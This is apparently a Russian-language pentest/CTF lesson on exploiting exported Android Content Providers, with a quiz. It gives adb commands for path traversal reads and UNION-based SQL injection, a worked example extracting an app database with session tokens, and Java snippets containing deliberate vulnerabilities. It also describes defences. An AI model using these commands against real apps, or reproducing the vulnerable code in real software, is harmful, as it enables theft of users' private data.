---
id: mobile-exported-provider
title: "Content Providers: path traversal, SQL-инъекции и утечки"
category: mobile
parent: mobile-exported-components
difficulty: hard
order: 3
tags: [content-provider, path-traversal, sqli, exported, uri, android]
prerequisites: [mobile-exported-components, mobile-android-anatomy]
useful_for:
  - "CTF Mobile (чтение файлов/БД через provider)"
  - "Bug bounty (утечка данных через Content Provider)"
  - "Пентест мобильных приложений"
estimated_minutes: 40
summary: "Как экспортированные Content Providers раскрывают данные: path traversal в openFile, SQL-инъекции в query, обход проверок и извлечение файлов и БД."
---
## Что такое Content Provider

Content Provider — один из четырёх базовых компонентов Android. Это интерфейс к структурированным данным (обычно SQLite), доступный другим приложениям через `content://`-URI. Провайдер реализует методы `query`, `insert`, `update`, `delete`, `openFile`, `call`. Если он **экспортирован** (`android:exported="true"` или наличие `<grant-uri-permission>`), другое приложение может обращаться к его данным. Именно поэтому providers — классический источник path traversal, SQL-инъекций и утечек приватных данных (файлы, контакты, токены).

Ментальная модель: provider — это удалённый «API к базе», где вход — URI и аргументы (`selection`, `selectionArgs`, `projection`, `sortOrder`). Уязвимость возникает, когда провайдер **доверяет** этим аргументам и не проверяет ни вызывающего, ни путь к файлу, ни корректность SQL.

## Как найти exported provider

```bash
apktool d app.apk -o out
grep -n -A6 "<provider" out/AndroidManifest.xml
```

```xml
<provider android:name=".DataProvider"
          android:authorities="com.target.provider"
          android:exported="true"
          android:grantUriPermissions="true">
  <grant-uri-permission android:pathPrefix="/files/"/>
</provider>
```

Признаки: `exported=true` без `android:permission`, `grantUriPermissions=true`, `pathPrefix`/`pathPattern` в `<grant-uri-permission>`, `FileProvider` с широкими `paths`. Декомпилируйте класс провайдера (`jadx`) и смотрите методы `query`/`openFile`.

```bash
grep -rn "extends ContentProvider\|openFile\|openAssetFile\|getType\|query(" out_jadx | head
```

## Path traversal в openFile

`ContentProvider.openFile` часто строит путь из URI-сегмента. Если он не нормализует путь — возможен выход за пределы разрешённой директории.

```java
// уязвимо: имя файла берётся из URI без нормализации
String name = uri.getLastPathSegment();
File f = new File(getContext().getFilesDir(), name);   // ../ читается!
return ParcelFileDescriptor.open(f, MODE_READ_ONLY);
```

Атака:

```bash
adb shell content read --uri "content://com.target.provider/../../../../etc/hosts"
adb shell content read --uri "content://com.target.provider/../../databases/app.db"
```

Для `FileProvider` (AndroidX) ищите `res/xml/file_paths.xml`: слишком широкий `path="."` или `root-path` открывает доступ ко многим файлам.

## SQL-инъекция в query

`selection` — это `WHERE`-фрагмент, а `selectionArgs` — параметры. Если провайдер склеивает `selection` без параметризации, инъекция возможна.

```java
// уязвимо: selection из недоверенного источника склеивается в SQL
String where = uri.getQueryParameter("filter");
Cursor c = db.rawQuery("SELECT * FROM items WHERE " + where, null);
```

```bash
adb shell content query --uri content://com.target.provider/items \
  --where "1=1) UNION SELECT _id,name,password FROM users--"
```

Инъекция может раскрыть другие таблицы (пароли, токены) или обойти фильтр. Аналогично проверяйте `sortOrder` (инъекция через `ORDER BY`) и `projection` (выборка чужих колонок).

## Утечки через projection и openFile

Даже без инъекции провайдер может отдавать больше, чем нужно: `projection` не ограничен белым списком, поэтому атакующий запрашивает все колонки. Через `openFile` можно вытащить произвольные файлы, если провайдер их отдаёт. Ищите провайдеры, отдающие `_data` (пути к файлам) — это прямая утечка структуры.

```bash
# забрать все колонки
adb shell content query --uri content://com.target.provider/items
# читать файл через provider
adb shell content read --uri "content://com.target.provider/secret.txt"
```

## Грант URI-разрешений

`FLAG_GRANT_READ_URI_PERMISSION`/`FLAG_GRANT_WRITE_URI_PERMISSION` временно дают доступ к конкретному URI, даже неэкспортированному провайдеру. Ошибки: грант выдаётся на широкий `pathPrefix`, или приложение принимает чужой URI и выдаёт на него грант (confused deputy). Если приложение по вашему Intent выдаёт грант на произвольный `content://`-URI — вы получаете доступ к чужим данным.

```java
// уязвимо: выдаём грант на URI, пришедший извне
intent.setData(externalUri);
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
startActivity(intent);   // грант утекает
```

## Вызов через adb

```bash
# список провайдеров на устройстве
adb shell content query --uri content://com.target.provider/ 2>&1 | head
# запрос
adb shell content query --uri content://com.target.provider/items --projection "*"
# чтение файла
adb shell content read --uri "content://com.target.provider/files/x.txt"
# вставка/обновление/удаление (если разрешено)
adb shell content insert --uri content://com.target.provider/items --bind name:s:evil
adb shell content update --uri content://com.target.provider/items --bind name:s:pwned
adb shell content delete --uri content://com.target.provider/items --where "1=1"
```

`content` — быстрый способ проверить поверхность без сборки клиента. Если provider защищён permission, получите `SecurityException`.

## Атака из своего приложения

Когда `adb content` недостаточно (нужны сложные URI, грант, `call`-метод), пишут клиент:

```java
ContentResolver cr = getContentResolver();
Uri u = Uri.parse("content://com.target.provider/files/../../databases/app.db");
try (InputStream in = cr.openInputStream(u)) {
    // читаем утёкший файл
}
```

Аналогично можно вызывать `cr.call(uri, "method", args, null)` — provider-метод `call` часто реализует внутренние операции без проверок.

## Разобранный пример: path traversal → утечка БД

```bash
$ grep -n -A5 "<provider" out/AndroidManifest.xml
<provider android:name=".FileProvider" android:authorities="com.target.fp"
          android:exported="true" android:grantUriPermissions="true">
  <grant-uri-permission android:pathPrefix="/"/>
</provider>
$ grep -rn "openFile" out_jadx/com/target/FileProvider.java
File f = new File(getContext().getFilesDir(), uri.getLastPathSegment());
$ adb shell content read --uri "content://com.target.fp/../../databases/app.db" > leak.db
$ sqlite3 leak.db "SELECT name,token FROM sessions;"
admin|eyJhbGciOiJIUzI1NiIsInR5cCI6...
```

Провайдер отдал БД с токенами из-за отсутствия нормализации пути и слишком широкого `pathPrefix`. Impact — утечка сессий.

## Справочная таблица: векторы Content Provider

| Вектор | Условие | Команда/метод |
|--------|---------|---------------|
| Path traversal | `openFile` без нормализации | `content read --uri .../../../...` |
| SQL-инъекция | склейка `selection` | `--where "1=1) UNION SELECT ..."` |
| Утечка колонок | нет белого списка `projection` | `--projection "*"` |
| Файлы через provider | широкий `file_paths.xml` | `content read` |
| Confused deputy | грант на внешний URI | `FLAG_GRANT_*` |
| `call` без проверки | метод `call` | `cr.call(...)` |
| Запись данных | нет permission на insert/update | `content insert/update` |

## Типовые ошибки новичка

- **Искать только `exported=true`.** Провайдер может быть доступен через грант или `call`.
- **Не проверять `file_paths.xml`.** У FileProvider доступ определяется им, а не манифестом.
- **Забыть про нормализацию.** `getCanonicalPath` + проверка префикса — правильная защита; её отсутствие = traversal.
- **Пропустить `sortOrder`.** Инъекция бывает и в `ORDER BY`.
- **Считать permission надёжным.** Проверьте `protectionLevel`; `normal` выдаётся автоматически.

## Что дальше / решение

Порядок: (1) собрать providers из манифеста; (2) проверить `exported`/permission/`file_paths.xml`; (3) декомпилировать `query`/`openFile`/`call`; (4) проверить traversal, SQLi, утечки через `adb content`; (5) при необходимости собрать клиент. Связанные уроки: `mobile-exported-components`, `mobile-android-anatomy`, `mobile-insecure-storage`. Решение — когда данные (файл/запись/токен) извлечены из чужого приложения или доказана инъекция.

## Практический чек-лист тестирования provider

1. Выписать все `<provider>` и их `authorities`, `exported`, `permission`, `grantUriPermissions`.
2. Для каждого — открыть класс (jadx) и прочитать `query`/`openFile`/`call`/`getType`.
3. Проверить `res/xml/file_paths.xml` (для FileProvider): нет ли `path="."`/`root-path`.
4. Проверить нормализацию пути в `openFile` (`getCanonicalPath` + префикс).
5. Проверить параметризацию `selection`/`sortOrder` (SQLi).
6. Проверить, ограничен ли `projection` белым списком.
7. Проверить логику грантов (`FLAG_GRANT_*`, confused deputy).
8. Прогнать `adb content query/read/insert/update/delete` и зафиксировать результат.

## Справочная таблица: инструменты и команды

| Задача | Инструмент | Команда |
|--------|-----------|---------|
| Найти providers | apktool/манифест | `grep -A6 "<provider"` |
| Прочитать логику | jadx | `grep -rn "openFile\|query("` |
| Проверить пути | apktool | `cat res/xml/file_paths.xml` |
| Запрос данных | adb | `content query --uri ...` |
| Чтение файла | adb | `content read --uri ...` |
| Инъекция | adb | `--where "1=1) UNION SELECT ..."` |
| Свой клиент | Android Studio | `ContentResolver.openInputStream` |

## Материалы и связанные темы

Дополнительно: Android-документация по `ContentProvider` и `FileProvider` (какие пути разрешены и как работает `grantUriPermissions`); OWASP MASTG по тестированию platform-interaction. Для практики — прогоните `content`-команды на своих приложениях и на CTF-задачах, где флаг лежит в чужом provider. Связанные уроки: `mobile-exported-components` (Activity/Service/Receiver/Provider), `mobile-android-binder` (IPC через Binder), `mobile-insecure-storage` (что именно утекает из хранилища).

## Квиз

```quiz
- question: "Какая уязвимость позволяет прочитать произвольный файл через Content Provider?"
  options:
    - "Path traversal в openFile"
    - "TLS downgrade"
    - "Слабый пароль"
    - "Отсутствие обфускации"
  answer: 0
  explanation: "Ненормализованный путь + ../../ даёт выход за пределы каталога."
- question: "Каким adb-инструментом обращаться к provider?"
  options:
    - "adb shell content"
    - "adb shell am"
    - "adb shell pm"
    - "adb shell wm"
  answer: 0
  explanation: "content query/read/insert работают с ContentProvider."
- question: "Что указывает на потенциальную SQL-инъекцию в provider?"
  options:
    - "Подстановка selection в SQL без параметризации"
    - "Использование HTTPS"
    - "Наличие exported=false"
    - "Использование Kotlin"
  answer: 0
  explanation: "Конкатенация selection/selectionArgs в SQL — классическая инъекция."
- question: "Чем опасен protectionLevel=normal у permission provider-а?"
  options:
    - "Любое приложение может его запросить"
    - "Он шифрует данные"
    - "Он отключает provider"
    - "Он требует root"
  answer: 0
  explanation: "normal-permission не проверяет подпись запрашивающего."
- question: "Какой флаг манифеста расширяет доступ к provider через Intent?"
  options:
    - "android:grantUriPermissions='true'"
    - "android:exported='false'"
    - "android:allowBackup"
    - "android:debuggable"
  answer: 0
  explanation: "grantUriPermissions разрешает временный доступ к URI."
```

## Где пригодится

- **CTF Mobile:** чтение флага/БД через provider.
- **Bug bounty:** утечка данных через Content Provider — валидная находка.
- **Пентест:** аудит IPC-поверхности приложения.
- **Работа:** ревью провайдеров и permissions.
